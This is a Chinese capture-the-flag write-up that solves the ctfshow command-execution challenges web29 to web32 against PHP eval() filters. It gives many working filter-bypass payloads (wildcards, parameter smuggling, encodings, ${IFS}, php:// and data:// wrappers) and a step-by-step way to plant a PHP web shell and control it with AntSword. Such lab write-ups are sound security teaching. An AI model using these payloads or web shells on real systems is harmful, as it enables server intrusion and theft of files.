---
title: "ctfshow-WEB入门（命令执行）第一篇"
description: "ctfshow-WEB入门（命令执行）第一篇"
image: "/assets/西施2.jpg"
date: 2026-11-05
updated: 2026-11-08
categories:
  - 学习
tags:
  - CTF
  - Web
  - 网络安全
  - 命令执行
type: tech
---

## ctfshow-WEB入门（命令执行）第一篇

::link-banner
---
banner: /assets/西施，冰雪.jpg
title: ctfshow-WEB入门（命令执行）第一篇
description: 题目来源:ctfshow的WEB入门题
link: "https://ctf.show/challenges"
---
::

### web29

提示：`命令执行，需要严格的过滤`，看到过滤了，那么我们要想到绕过

![image-20261105084924182](/assets/ctfshow-web-command-exec/image-20261105084924182.png)

进入靶场我们能看到php源码

![image-20261105085029503](/assets/ctfshow-web-command-exec/image-20261105085029503.png)

> **接收 URL 里的 `c` 参数 → 检查里面没有 "flag" 这个词 → 把它当 PHP 代码执行。**

防御只有一个词的黑名单，漏洞是 `eval`。

以下是一些代码的解释，不想看的可以跳过：

#### 代码拆解：

##### 第 1 行：关闭报错

```
error_reporting(0);
```

| 词                  | 意思                           |
| :------------------ | :----------------------------- |
| `error_reporting()` | PHP 的「错误报告级别」设置函数 |
| `0`                 | 级别 0 = **什么错误都不显示**  |

代码就算出错了，页面也**一片空白，不报任何错**。所以以后看到白屏，别以为“没执行成功”，很可能是执行了但报错被藏起来了。

##### 第 2 行：有没有传 c 参数？

```
if(isset($_GET['c'])){
```

| 词        | 意思                                                         |
| :-------- | :----------------------------------------------------------- |
| `$_GET`   | PHP 的超全局数组，存放 **URL 问号后面的参数**。访问 `?c=abc`，则 `$_GET['c']` 的值就是 `"abc"` |
| `isset()` | is set，「变量是否已设置」。存在且不为 null 返回 true        |
| `if(...)` | 条件判断，真则进入花括号执行                                 |

**整句**：URL 里带了 `c` 参数吗？带了就走下面；没带就走最后的 `else`。

##### 第 3 行：取出参数

```
$c = $_GET['c'];
```

把 c 参数的值存进变量 `$c`。**从这一行起，`$c` 的内容 由我们控制**——这是“输入点”。

##### 第 4 行：正则黑名单

```
if(!preg_match("/flag/i", $c)){
```

| 部分                       | 意思                                                         |
| :------------------------- | :----------------------------------------------------------- |
| `preg_match(模式, 字符串)` | 正则匹配函数：在字符串里找模式，**找到返回 1，找不到返回 0** |
| `/` ... `/`                | 定界符，正则表达式必须包在两个斜杠之间                       |
| `flag`                     | 要找的字面内容：flag 这四个字母**连着出现**                  |
| 末尾 `i`                   | 修饰符 = **ignore case，不区分大小写**（FLAG、Flag、fLaG 都算命中） |
| `!`                        | 逻辑取反                                                     |

意思是：如果 `$c` 里**没有**出现 "flag"（不分大小写），才执行下一行。

**注意它防了什么、没防什么**：它只挡了 `flag` 这一个词，没有挡 `system`、`cat`、`eval`、引号、空格……这是**黑名单过滤**。

##### 第 5 行：漏洞

```
eval($c);
```

| 词       | 意思                                                        |
| :------- | :---------------------------------------------------------- |
| `eval()` | evaluate，**把字符串当作 PHP 代码执行**。PHP 里最危险的函数 |

`$c` 是我们传的 → 我们能让服务器执行**任意 PHP 代码**，这叫**任意代码执行（RCE 的一种）**。

**两条铁律**：

1. eval 里的字符串必须是**完整的 PHP 语句，结尾必须有分号 `;`**——少了分号会报错，而报错又被 `error_reporting(0)` 藏了 → 表现为白屏。
2. 它执行的是 **PHP 代码**，不是直接执行 Linux 命令。想跑系统命令，要在里面调 `system("Linux命令")`。

##### 第 6 行：没传参数时给你看源码

```
}else{
    highlight_file(__FILE__);
}
```

| 词                 | 意思                                 |
| :----------------- | :----------------------------------- |
| `highlight_file()` | 把一个文件的源码**语法高亮显示**出来 |
| `__FILE__`         | 魔法常量 = 当前文件自己的完整路径    |

**整句**：你不传 `c`，它就把自己的源码亮给你看——题目主动告诉你“来审计我”。

##### 漏洞链

```
你的输入(?c=...) → $_GET['c'] → $c → eval($c) 任意代码执行
                                          ↓
                              eval 里再调 system() → 任意 Linux 命令执行
```

**解题通用模板**：`?c=system("Linux命令");`——用 eval 执行 PHP 的 system 函数，system 再去执行 Linux 命令。这是“代码执行”升级成“命令执行”。

#### 侦察

```
?c=system("ls");
```

![image-20261105090055467](/assets/ctfshow-web-command-exec/image-20261105090055467.png)

看到目录里有 `flag.php` 和 `index.php`，那么我们读一下flag.php。

接下来有很多解法，都可以试试看：

#### 法1：让 flag 不连着出现-通配符绕过

任选其一

```
?c=system("tac fla*");
?c=system("tac fl?g.php");
?c=system("tac f*");
```

![image-20261105101417211](/assets/ctfshow-web-command-exec/image-20261105101417211.png)

| 符号 | 叫什么          | 意思                                               |
| :--- | :-------------- | :------------------------------------------------- |
| `*`  | 通配符 wildcard | 匹配**任意多个**任意字符，`fla*` 能匹配 `flag.php` |
| `?`  | 通配符          | 匹配**单个**任意字符，`fl?g` 同样能匹配 `flag`     |

**原理**：过滤检查的是你**提交时**的字符串，那时 `fla*` 还不是 `flag`；等服务器上的 Linux shell 执行命令时才把 `*` 展开成真文件名——检查环节根本看不到 "flag" 三个字母连着。

**一些小知识：**

> - **`*` 放在 flag 的开头、中间、结尾都可以，还能同时放多个**。这是 **Linux 服务器上 shell 通配符（globbing）** 的行为，位置不限
> - **`*` 不匹配以点 `.` 开头的隐藏文件**，也不会跨越路径分隔符 `/`。如果 flag 文件在别的目录，得写对路径，比如 `tac /tmp/f*`。

##### Q1：为什么大家都用 `tac` 不用 `cat`？

> `flag.php` 的内容以 `<?php` 开头。浏览器看到 `<` 开头的东西会**当成 HTML 标签渲染掉**，所以 `cat` 正序输出时整块被“吃掉”，页面看着是**空白**——其实内容在，**右键查看网页源代码 / F12** 就能看到。
>
> 接下来法2就是cat的解法

#### 法2：换个方式读，不用tac用cat

```
?c=system("cat fla*");     ← 页面空白，要 F12 看源码
?c=system("tac fla*");     ← 直接显示
?c=system("cat fla*.php | tac");   ← cat 输出再倒序，效果同 tac
```

> 注意：`cat fla*.php` 里带 `.php`，这条**只适用于 web29**；从 web30 开始 `php` 也会被挡，要改用 `fla*`、`f*` 这类通配符。

![image-20261105101503448](/assets/ctfshow-web-command-exec/image-20261105101503448.png)

`grep` 版（把 flag 那行滤出来）：

```
?c=system("cat fl*g.php | grep -E 'fl.g'");
```

（`egrep` = `grep -E`；`|` 是管道，把左边命令的输出交给右边命令处理）

![image-20261105101528679](/assets/ctfshow-web-command-exec/image-20261105101528679.png)

##### Q1：-E是什么意思？

> E 是 Extended（扩展的）的首字母，意思是 “让 grep 按**扩展正则表达式（Extended Regular Expressions，简称 ERE）** 来解释模式”
>
> **加不加 -E 的区别：**
>
> - **不加 -E 的普通 grep**：用的是**基础正则（BRE）**。在基础正则里，`?`、`+`、`|`、`{}`、`()` 这些符号默认是**普通字符**，想让它们起特殊作用得加反斜杠，比如 `\?`、`\+`
> - **加了 -E**：这些符号直接就按正则语法生效，不用再写反斜杠，写起来更省事
> - 历史上有个独立命令叫 **egrep**，它就是 `grep -E` 的别名，现在 egrep 已经被标记为过时，官方推荐直接写 `grep -E`
>
> **区分 grep 的另外两个常见选项：**
>
> - `-F`：**Fixed**，把模式当成固定字符串，不做任何正则解释（相当于==纯文本==查找）
> - `-P`：**Perl**，用 Perl 风格的正则，功能更强，支持 `\d`、`\w` 这类写法

##### Q2:为什么gerp是fl.g而不是fl*g?

> 这个 `.` 是正则表达式里的 “任意单个字符”
>
> 这里和前面讲的 shell 通配符是**两套不同的语言**：
>
> - `cat fl*g.php` 这部分在 **shell** 里执行，`*` 是通配符
> - `grep -E 'fl.g'` 这部分在 **grep 的正则表达式（regex）**里执行，`-E` 表示扩展正则。在正则里，**`.`（点）才是 “匹配任意一个字符” 的符号**，所以 `fl.g` 能匹配到 `flag`，点正好代替了字母 a

##### Q3:为什么grep这里用 `.` 而不是 `?`

> **在 grep 正则里，符号的含义和 shell 完全不同：**
>
> - 正则里的 `.` = 任意一个字符（相当于 shell 里的 `?`）
> - 正则里的 `?` = “前面的字符出现 0 次或 1 次”，是个量词，**不是**“任意字符” 的意思
> - 正则里的 `*` = “前面的字符重复 0 次或多次”，也不是 shell 里那个意思
>
> 所以在 grep 里想表达 “fl 后面任意一个字符再 g”，就必须写成 `fl.g`，不能写成 `fl?g`。

###### 看不懂上面的grep内容，可以看下面这些例子：

> 首先要知道**grep正则里的符号分两种角色:**
>
> 角色一：占位符（自己占一个字符的位置）
>
> - 普通字母 `f`、`l`、`g` 都是占位符，而且要求 “必须是我这个字母”
> - **`.` 也是占位符**，但它的要求是 “这个位置随便谁都行”，相当于一个空白格
>
> 角色二：量词（自己不占位置，只修饰它前面的那个字符）
>
> - `?`、`*`、`+` 都是量词，它们像贴在前面字符旁边的备注：
> 	- `?` = 前面这个字符可以出现 **0 次或 1 次**
> 	- `*` = 前面这个字符可以出现 **0 次或很多次**
> 	- `+` = 前面这个字符必须出现 **1 次或更多次**
>
> **`fl.g`（用了点）**
>
> - 读法：f + l + 一个 “任意字符” 的空格 + g，一共 4 个位置
> - 所以 `flag` 能匹配（点的位置填 a），`flbg` 也能匹配（填 b）
>
> **`fl?g`（用了问号）**
>
> - 注意：`?` 贴在 `l` 后面，它是给 `l` 的备注，意思是 “**l 可以不写，最多写一遍**”
> - 读法：f +（l 可有可无）+ g
> - 所以它匹配的是 `fg`（l 没写）和 `flg`（l 写了一遍）
> - `flag` 是 4 个字符，中间那个 a 没有任何位置留给它，所以实测结果是 **False**
>
> **`fl*g`（用了星号）**
>
> - `*` 也是给 `l` 的备注：“l 可以不写，也可以写很多遍”
> - 匹配的是 `fg`、`flg`、`fllg`、`flllg` 这种，同样匹配不到 `flag`

#### 法3：把文件弄到能直接访问的地方

```
?c=system("cp fla*.php a.txt");
```

- `cp` = copy（复制），是 Linux shell 里复制文件的命令。

- 语法是 `cp 源文件 目标文件`：

	- shell 先把 `fla*.php` 展开成真实文件名，比如 `flag.php`

	- 然后把 `flag.php` **复制一份**，命名为 `a.txt`，原文件 `flag.php` 还在，不会被删

然后浏览器直接访问 `https://靶机/a.txt` ——拷贝改后缀，绕开一切渲染问题。

![image-20261105115041091](/assets/ctfshow-web-command-exec/image-20261105115041091.png)

![image-20261105115110837](/assets/ctfshow-web-command-exec/image-20261105115110837.png)

#### 法4：参数转移

`preg_match` **只检查了 c 这一个参数**！把真正的命令放到另一个参数里：

```
?c=eval($_GET[1]);&1=system("tac flag.php");
```

c 的值是 `eval($_GET[1]);`——里面没有 flag；命令藏在**第二个参数 `1`** 里，eval 执行时才取出来。

![image-20261105115143448](/assets/ctfshow-web-command-exec/image-20261105115143448.png)

**include + PHP 伪协议版**(读文件专用，连括号都不用)：

```
?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
```

![image-20261105115219447](/assets/ctfshow-web-command-exec/image-20261105115219447.png)

![image-20261105115257629](/assets/ctfshow-web-command-exec/image-20261105115257629.png)

- `include` 是语言构造不是函数，可以不写括号
- `php://filter/read=convert.base64-encode/resource=flag.php` = 把 flag.php 的**源码** base64 编码后输出（避免 `<?php` 被浏览器吃掉的问题）
- 出来一串 base64，解码就得到 flag
- `?>` 是提前结束 PHP 语句的写法（include 那句后面不用分号）

##### Q1：`include$_GET[1]?>` 里的 `?>` 是什么？为什么不用分号？

> **`?>` 是 PHP 的结束标记（closing tag）。**
>
> URL它其实是两个参数：
>
> ```
> ?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
> └────── c 的值 ──────┘ └───────────── 参数 1 的值 ─────────────┘
> ```
>
> - 参数 **c** 的值 = `include$_GET[1]?>`
> - 参数 **1** 的值 = `php://filter/read=convert.base64-encode/resource=flag.php`
>
> eval 实际执行的 PHP 代码是：
>
> ```
> include$_GET[1]?>
> ```
>
> | 部分       | 意思                                                         |
> | :--------- | :----------------------------------------------------------- |
> | `include`  | PHP「包含」语句，把指定文件内容拿进来。**语句不是函数，所以可以不写括号** |
> | `$_GET[1]` | 取 URL 里名为 `1` 的参数 → 那串 `php://filter/...`           |
> | `?>`       | PHP 结束标记                                                 |
>
> **为什么能代替分号**：PHP 的语法规则是——每条语句结尾，**要么写分号 `;`，要么用 `?>` 收尾**。`?>` 自带「结束当前语句」的效果，所以这两种写法等价：
>
> ```
> include $_GET[1];    // 分号收尾
> include $_GET[1]?>   // ?> 收尾，不用分号
> ```

##### Q2：为什么用 `?>` 而不用 `;`？

> 这条 payload 塞在 URL 查询字符串里，而 PHP 的 `arg_separator.input` 默认把 `;` 也当作参数==分隔符==（作用等同 `&`）。写 `?c=include$_GET[1];&1=...` 时那个 `;` 可能把参数截断。用 `?>` 绕开这个坑，顺便替了分号的作用。
>
> **反证**：如果既不分号也不写 `?>` → `include$_GET[1]` 语句没结束 → PHP 语法报错 → 报错被 `error_reporting(0)` 藏了 → 页面空白。

#### 法5：编码绕过

```
?c=system(base64_decode('dGFjIGZsYSo='));
```

![image-20261105115333631](/assets/ctfshow-web-command-exec/image-20261105115333631.png)

`dGFjIGZsYSo=` 解码就是 `tac fla*`。检查时 c 里只有一串看不懂的 base64，运行时才解码——和法1同理：**让敏感词在“检查的时候”不存在**。

里面的base64编码也可以使用`tac flag`的base64编码`dGFjIGZsYWc=`

#### 法6：PHP 函数流，不使用linux命令

```
?c=highlight_file(next(array_reverse(scandir("."))));
```

![image-20261105115354147](/assets/ctfshow-web-command-exec/image-20261105115354147.png)

从里往外读：

1.`scandir(".")` —— 列出当前目录所有文件 → `['.', '..', 'flag.php', 'index.php']`

2.`array_reverse(...)` —— 数组倒过来 → `['index.php', 'flag.php', '..', '.']`

3.`next(...)` —— 把数组指针后移一位，从 index.php 移到 **flag.php**

4.`highlight_file(...)` —— 高亮显示它的源码

与`highlight_file(base64_decode("ZmxhZy5waHA="))` 是同思想（`ZmxhZy5waHA=` 解码 = flag.php）。

#### 法7：写一句话木马 + 蚁剑

打开**中国蚁剑**（`cd /d C:\HelloCTF\Toolkit\Web\AntSword-Loader-v4.0.3-win32-x64
AntSword.exe`）

![image-20261105125226271](/assets/ctfshow-web-command-exec/image-20261105125226271.png)

##### 在靶机上写入一句话木马

浏览器地址栏直接访问（URL 安全版，不含 `<` `?` 这些会被浏览器吃掉的字符）：

```
<URL>?c=file_put_contents('shell.php',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg=='));
```

![image-20261105185540035](/assets/ctfshow-web-command-exec/image-20261105185540035.png)

base64 编码前的原始木马

```
?c=file_put_contents('shell.php','<?php eval($_POST[1]);?>');
```

> `PD9waHAg...` 解码就是 `<?php @eval($_POST[1]);?>`，也就是一句话木马。`@` 用来压制报错。页面**没反应/空白是正常的**（`error_reporting(0)` 关掉了回显）。

**验证是否写成功**：再访问

```
https://....challenge.ctf.show/shell.php
```

![image-20261105185604958](/assets/ctfshow-web-command-exec/image-20261105185604958.png)

- 页面空白（不报 404）→ 木马已写入
- 显示 404 → 没写成功，回去检查 payload 有没有粘全

##### 在蚁剑里添加 shell

左侧空白界面里右键，点击`添加数据`

![image-20261105172154200](/assets/ctfshow-web-command-exec/image-20261105172154200.png)



![image-20261105172214651](/assets/ctfshow-web-command-exec/image-20261105172214651.png)

弹窗里填：

| 选项              | 填什么                                                       |
| :---------------- | :----------------------------------------------------------- |
| **URL 地址**      | `http://<你的靶场地址>/shell.php`（==去掉https的s==） |
| **连接密码**      | `1`                                                          |
| 编码器 / 编码设置 | 默认（default）                                              |
| 类型              | PHP（一般会自动识别）                                        |

1.点「测试连接」：

- 显示类似「成功 / 返回数据正常」→ 点「添加」保存
- 显示失败 → 看下面「连不上怎么办」

2.回到主界面，**双击**刚添加的那条记录，就进入文件管理了。

![image-20261105190757398](/assets/ctfshow-web-command-exec/image-20261105190757398.png)

##### 找 flag

进去后默认打开**文件管理**，左边是目录树：

1.定位到网站根目录（就是你 shell.php 所在目录）

2.找到 `flag.php` → 右键「打开」/「编辑」直接看内容

3.里面就是 `ctfshow{...}`

![image-20261105190829059](/assets/ctfshow-web-command-exec/image-20261105190829059.png)

另外也可以用上方的 **「虚拟终端」**（有的版本叫「终端」），直接敲：

```
ls
cat flag.php
```

![image-20261105191209968](/assets/ctfshow-web-command-exec/image-20261105191209968.png)

![image-20261105191316303](/assets/ctfshow-web-command-exec/image-20261105191316303.png)

效果和你在网页里 `?c=system("cat fla*");` 一样，但能交互式执行任意命令。

连接 `https://靶机/shell.php`，密码 `1`，图形化界面里翻文件就像操作自己的电脑。也可以不写内容直接 `eval($_POST[1])` 连当前页。

#### 法8：反引号内联执行

```
?c=echo `tac fla*`;
```

反引号（键盘左上角、和 `~` 同一个键）在 PHP 里等价于 `shell_exec()`，执行命令并返回结果。

![image-20261105122908755](/assets/ctfshow-web-command-exec/image-20261105122908755.png)

##### Q1：这里的反引号是什么意思，有什么用？

```
?c=echo `tac fla*`;
```

> 这两个符号叫**反引号**，在 shell 里它表示命令替换。这是 **Linux shell** 的语法，运行在远程靶机上。
>
> 它的作用：先执行里面的命令，再把结果替换出来
>
> **shell 看到反引号后，会做两件事：**
>
> 1.先把反引号**里面的命令执行一遍**
>
> 2.再把整段反引号（包括两个 ` 符号）替换成那条命令的**输出结果**，然后才执行外面的命令
>
> 所以这条命令：
>
> ```
> echo `tac fla*`
> ```
>
> 执行过程是：
>
> 1.shell 先跑 `tac fla*`，得到 flag 文件的内容（比如 `flag{xxxx}`）
>
> 2.命令就变成了 `echo flag{xxxx}`
>
> 3.echo 再把这段内容打印出来，你就看到了 flag

##### Q2：加不加反引号有什么区别？

> - `echo tac fla*`（没有反引号）：echo 只会把 `tac` 和文件名当**普通文字**打印出来，tac 根本不执行
>
> - ```
> 	echo `tac fla*`;
> 	```
>
> 	（有反引号）：tac 会被**执行**，echo 打印的是 tac 读出来的内容
>
> 反引号是老式语法，现在 shell 更推荐用 **`$( )`**，效果是一样的：
>
> ```
> echo $(tac fla*)
> ```
>
> `$( )` 的好处是可以层层嵌套（命令里再套命令），如果使用反引号，嵌套时要写一堆转义符，会比较麻烦。

##### 区分这三种引号：

> - 反引号 `：执行里面的命令并替换成输出
> - 单引号 '：里面的内容原样保留，不做任何执行和替换
> - 双引号 "：里面允许变量和命令替换生效

### web30

![image-20261105194121470](/assets/ctfshow-web-command-exec/image-20261105194121470.png)

php代码的意思是传参c里不能出现flag，system，php。无论大小写。

#### web29在这里复用的方法

| 方法           | payload                                                      | 说明                                   |
| :------------- | :----------------------------------------------------------- | :------------------------------------- |
| 通配符         | `?c=passthru("tac fla*");`                                   | `*` 匹配任意长度                       |
| 单字符通配     | `?c=passthru("tac fla?????");`                               | `?` 匹配单个字符(fla+5个=8位=flag.php) |
| 通配符         | `?c=passthru("tac f*");`                                     | `f*` 同时避开 flag 和 php 两个词       |
| 参数转移       | `?c=eval($_GET[1]);&1=system("tac flag.php");`               | c 里干净，命令执行放参数 1             |
| 伪协议         | `?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php` | 输出 base64 再解码                     |
| 拷走           | `?c=passthru("cp fla*.ph* 2.txt");` 再访问 `/2.txt`          | 用通配符绕 php                         |
| 蚁剑           | 写木马后连                                                   | 需要容器活着                           |

#### 下面是一些其他新增的解法：

##### 1.换命令执行函数(替代 system)

PHP 里能执行系统命令的函数有一大把，system 只是最常用的那个：

| 函数           | 写法                              | 回显特点                               |
| :------------- | :-------------------------------- | :------------------------------------- |
| `system()`     | 被挡                              | 直接输出全部结果                       |
| `passthru()`   | `?c=passthru("tac fla*");`        | 直接输出(二进制也安全)                 |
| `shell_exec()` | `?c=echo shell_exec("tac fla*");` | **返回**字符串，**必须 echo 才看得到** |
| `exec()`       | `?c=echo exec("tac fla*");`       | 只返回**最后一行**，必须 echo          |
| 反引号         | ``?c=echo `tac fla*`;``           | 等价 `shell_exec`，最省事              |

##### 2.动态函数调用(可变函数)

PHP 有个特性：**变量后面加括号，如果变量的值是函数名字符串，就调用那个函数**。这叫「可变函数(variable function)」。

```
?c=$a='sys';$b='tem';$d=$a.$b;$d('tac fl*');
```

逐步看：

- `$a='sys';` → 变量 a 存了 `sys`
- `$b='tem';` → 变量 b 存了 `tem`
- `$d=$a.$b;` → 拼接成 `system`（`.` 在 PHP 里是字符串连接符）
- `$d('tac fl*');` → 变量 d 的值是 "system"，于是**调用 system** 执行命令

**为什么能过正则？** 因为我们提交的字符串里，`sys` 和 `tem` 是两个分开的字符串，从头到尾没有出现过连续的 `system` 七个字母。正则检查的是"字面文本"，而函数名是**运行时才拼出来**的，这是「检查时刻 vs 使用时刻」的时间差。

> 同类变体：`call_user_func('passthru','ls')`、用 `chr()` 拼函数名、`strrev('metsys')`（倒序）。

##### 3.shell 层拼文件名(反斜杠 / 引号)

这两个技巧**必须在命令执行函数里用**（因为要靠 Linux shell 解析）：

**反斜杠转义**：

```
?c=passthru("cat f\lag.p\hp");
```

- PHP 收到的字符串是 `cat f\lag.p\hp`——正则找 `flag` 找不到（中间隔着 `\`），找 `php` 也找不到
- 命令交给 Linux shell 后，shell 把 `\l` 解释为"转义 l"，去掉反斜杠 → 实际执行 `cat flag.php`

**引号拼接**：

```
?c=passthru("cat fl''ag.p''hp");
```

- 提交的字符串是 `fl''ag.p''hp`，同样没有连写的 flag/php
- shell 里**相邻的字符串会自动拼接**：`fl` + `ag` = `flag`，`p` + `hp` = `php`

> 这就是常说的「**双层解析**」：PHP 层先过正则，shell 层再做真正的解析。你写的东西在两层里"看起来不一样"，绕过就发生了。

##### 4.PHP 层拼字符串(chr / base64 / 连接符)

不靠 shell，直接在 PHP 里把文件名拼出来：

```
?c=readfile('fl'.'ag'.chr(46).chr(112).chr(104).chr(112));
```

- PHP 的 `.` 连接字符串：`'fl'.'ag'` = `flag`
- `chr(46)` = `.`，`chr(112)` = `p`，`chr(104)` = `h`，`chr(112)` = `p` → 拼出 `.php`
- `readfile()` 直接把文件内容输出到页面

base64 版（web29 也用过）：

```
?c=passthru(base64_decode('Y2F0IGZsYWcucGhw'));
```

（`Y2F0IGZsYWcucGhw` 解码 = `cat flag.php`）

##### 5.纯 PHP 读文件(用不到系统命令)

```
?c=show_source(scandir('.')[2]);
```

拆开看：

- `scandir('.')` → 列出当前目录，返回数组 `['.', '..', 'flag.php', 'index.php']`（按字母序）
- `[2]` → 取**下标 2** 的元素，正好是 `flag.php`
- `show_source()` → 高亮显示该文件源码（PHP 函数，不是 shell 命令）

整个 payload 里没有 flag、没有 system、没有 php 三个词。类似的还有：

| 函数                  | 作用                             |
| :-------------------- | :------------------------------- |
| `highlight_file()`    | 高亮输出文件源码（复用自 web29） |
| `show_source()`       | 同上，是别名                     |
| `readfile()`          | 直接输出文件内容                 |
| `file_get_contents()` | 读成字符串，需要 echo            |

### web31

![image-20261105210331377](/assets/ctfshow-web-command-exec/image-20261105210331377.png)

```
"/flag|system|php|cat|sort|shell|\.| |\'/i"
```

- 两个 `/` 是正则的边界符
- `|` 表示 “或者”，所以每一段都是一个独立的禁词
- `\.` 里的反斜杠是转义，意思是 “**字面意义的点**”（不转义的点在正则里是任意字符）
- ` ` 单独一个空格，就是禁止空格
- `\'` 表示**单引号**
- 结尾的 `/i` 是大小写不敏感，所以 `FLAG`、`Php`、`Cat` 这种大写也一样拦

**提交的 c 参数里，不能出现下面的任何一个：**

flag，system，php，cat，sort，shell，.（点），空格，单引号 `'`

#### 之前题目复用的方法

| 方法                                     | 在 web31 的写法                                | 备注                                 |
| :--------------------------------------- | :--------------------------------------------- | :----------------------------------- |
| **通配符**                               | `fla*`、`f*`、`fla?????`                       | `f*` 同时绕 flag 和 php              |
| **参数转移 / eval 嵌套**                 | `?c=eval($_GET[1]);&1=system("tac flag.php");` | **万能钥匙**，因为 preg_match 只查 c |
| **passthru 换 system**                   | `?c=passthru("ls");`                           | web30说过了，继续用                  |
| **反引号执行**                           | ``?c=echo`tac%09fla*`;``                       | shell 二字被挡但反引号本身没被挡     |
| **show_source/highlight_file + scandir** | `show_source(scandir(getcwd())[2])`            | 思路一样，但 `.` 要换写法(见下)      |
| **base64_decode**                        | `?c=passthru(base64_decode("..."));`           | base64 串本身安全，但包裹要用双引号  |

**在 web31 失效了（web30 能用，这里不能）**

| 方法                                          | 为什么失效          | 替代                                      |
| :-------------------------------------------- | :------------------ | :---------------------------------------- |
| PHP 点号拼接 `'fl'.'ag'`、`$a.$b` 拼 `system` | **`.` 被挡**        | 用 `chr()` 拼、`"\xHH"`、参数转移         |
| 单引号字符串 `'ls'`                           | **`'` 被挡**        | 改用双引号 `"ls"`                         |
| `php://filter` 伪协议                         | 含 **php** 三个字母 | 用 getcwd/glob 读文件                     |
| `cp flag.php a.txt` 落地                      | 文件名有**点**      | `cp fla* 1`（无扩展名），或 `cp fla*%09a` |
| `shell_exec()`                                | 含 **shell**        | 反引号 / passthru                         |
| `system()`                                    | 含 **system**       | passthru / exec / 反引号                  |

**本次新学的（一共 8 组，对应下面 1~8 小节）内容是：**

1. 空格替代：`%09`(Tab)、`${IFS}`
2. 读文件命令替代：`tac`、`nl`、`tail`、`head`
3. shell 被挡：用反引号代替 `shell_exec()`
4. 点号替代：`getcwd()`、`pos(localeconv())`、`chr(46)`
5. 字符串构造：十六进制转义 `"\x66\x6c..."`
6. `glob()` 直接找文件
7. 取反 `~` 绕过
8. 命令替换 `$(...)`

#### 这三条比较常用，记这三条：

`passthru("tac%09fla*")`、`eval($_GET[1])` 嵌套、`show_source(scandir(getcwd())[2])`。

#### 一些新的方法：

##### 1.空格被挡可以使用`%09` 或 `${IFS}`

`%09` 是 **Tab（制表符）** 的 URL 编码。Linux shell 把 Tab 和空格一样当"分隔符"，而正则匹配的是字面空格字符，Tab 不是空格，所以能够绕过。

```
?c=passthru("tac%09fla*");
```

其他等价写法：

| 写法                         | 原理                                                |
| :--------------------------- | :-------------------------------------------------- |
| `%09`                        | Tab，最常用                                         |
| `$IFS` / `${IFS}` / `$IFS$9` | IFS 是 shell 的内置变量，值默认是「空格+Tab+换行」  |
| `%20`                        | URL编码，这个**不行**，它解码出来就是空格，正好被挡 |

**容易踩坑的地方**：双引号字符串里 `$` 会被 PHP 当成变量插值。写 `"tac${IFS}fla*"` 时 PHP 会把 `${IFS}` 替换成空值，命令变成 `tacfla*` 就错了。所以要**反斜杠转义**：

```
?c=passthru("tac\${IFS}fla*");
```

##### 2.cat/sort 被挡，那么换成-读文件命令

| 原命令 | 替代                                                      |
| :----- | :-------------------------------------------------------- |
| `cat`  | `tac`(倒序)、`nl`(带行号)、`tail`、`head`、`more`、`less` |

任何一条都行，`tac`（web29已经说过了）。

##### 3.shell 被挡，shell_exec 不可以，反引号可以

`shell_exec("cmd")` 含 `shell`，直接被挡。但反引号 ``cmd`` 是它语法层面的等价物，没有任何被挡的字面：

```
?c=echo`tac%09fla*`;
```

##### 4.点号被挡，有三种拿"当前目录"的办法

原来大家爱写 `scandir(".")`，现在 `.` 不能出现。三个替代：

**(1) `getcwd()`**

```
?c=show_source(scandir(getcwd())[2]);
```

`getcwd()` 返回当前工作目录路径（字符串），不需要点号。

**(2)`pos(localeconv())`**

```
?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
```

- `localeconv()` 返回本地化信息数组，**第一个元素就是小数点 `"."`**
- `pos()` = `current()`，取数组当前第一个元素 → 得到 `"."`

**(3)`chr(46)` / `"\x2e"`**

```
?c=show_source(scandir(chr(46))[2]);
```

`chr(46)` 就是 `.` 的 ASCII 码，字面上不含点。

##### 5.十六进制转义（构造文件名）

PHP 双引号字符串支持 `\xHH` 转义：

```
?c=readfile("\x66\x6c\x61\x67\x2e\x70\x68\x70");
```

`\x66\x6c\x61\x67` = `flag`，`\x2e` = `.`，`\x70\x68\x70` = `php` → 拼成 `flag.php`。payload 里没有 flag/php/点的字面。

##### 6.`glob()` 直接找文件

```
?c=$f=glob("f*");show_source($f[0]);
```

`glob("f*")` 返回匹配的文件路径数组 `['flag.php']`，`$f[0]` 取第一个，`show_source` 读它。不用写flag、不写 php、不写点。

##### 7.取反 `~` 绕过（了解即可）

```
?c=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F);
```

原理：把 `system` 和 `cat flag.php` 每个字符取按位取反(`~`)，得到一堆高位字节，URL 编码后提交。正则里当然没有这些乱码，运行时 PHP 再 `~` 一次还原成明文。

##### 8.命令替换 `$(...)`（不写文件名的思路）

```
?c=echo`tac $(ls -1 | head -n 1)`;
```

`ls -1 | head -n 1` 动态拿到第一个文件名，再交给 tac。好处是**完全不用写文件名**。但注意：必须有反引号（让整串作为命令执行）。

### web32~35可以共用同一条 payload秒了

```
?c=include$_GET[1]?>&1=data://text/plain,<?php system("tac flag.php")?>
```

下面web32~35是其他一些内容，如果只是刷题就可以不用看了

### web32

![image-20261106163659711](/assets/ctfshow-web-command-exec/image-20261106163659711.png)

**提交的 c 参数里，一共禁止 13 样东西**

- 禁词（7个单词，大小写都拦，因为有 /i）：
	- flag，system，php，cat，sort，shell，echo

- **禁符号（6个）：**
	- `.`（点）：`\.` 是转义后的字面点
	- 空格
	- 单引号 `'`：`\'`
	- 反引号`
	- 分号 `;`
	- 左括号 `(`

#### 四个关键封杀点

| 被封   | 为什么致命                                                   |
| :----- | :----------------------------------------------------------- |
| `(`    | **所有函数调用都没了**——`passthru(...)`、`system(...)`、`show_source(...)`、`scandir(...)`、连 `eval(...)` 本身都调不了 |
| 反引号 | 反引号命令执行没了                                           |
| `;`    | 语句不能用分号结束                                           |
| `echo` | 不能回显输出                                                 |

**web31 那套「函数 + 通配符 + 反引号」的打法，在这里全部报废**。因为 PHP 里调用函数必须写括号，没括号就调不了。

#### 重复的方法：

思路在重复(但实现方式要升级了)

| 老思路                                           | 在 web32 的形态                           | 说明                                                |
| :----------------------------------------------- | :---------------------------------------- | :-------------------------------------------------- |
| **参数转移**(c 里放干净的东西，命令丢第二个参数) | `?c=include$_GET[1]?>&1=...`              | 一模一样的思想，web29/30/31 都在用                  |
